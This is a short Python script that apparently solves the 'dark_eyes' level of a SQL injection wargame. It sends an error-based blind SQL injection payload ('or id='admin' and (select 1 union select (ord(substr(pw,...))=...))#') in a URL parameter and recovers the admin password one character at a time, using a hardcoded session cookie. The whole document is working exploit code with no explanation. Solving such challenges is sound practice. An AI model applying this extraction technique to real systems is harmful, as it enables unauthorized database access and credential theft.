import requests

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
headers = {"Cookie" : "PHPSESSID=1mg3tdj3njma0epf82af1kr1d2"}

def get_pw(index):
    
    for i in range(33,126):
        
        value = "' or id='admin' and (select 1 union select (ord(substr(pw,{},1))={}))#".format(str(index),str(i))

        r = requests.get(url, params={'pw' : value}, headers = headers)

        if "select id from prob_dark_eyes where" in r.text:
            print(chr(i),end="")
            return True

    return False

############### Get PASSWORD ################

ret = True
index = 0

print("PASSWORD - ",end="")

while ret:
    index += 1
    ret = get_pw(index)

###########################################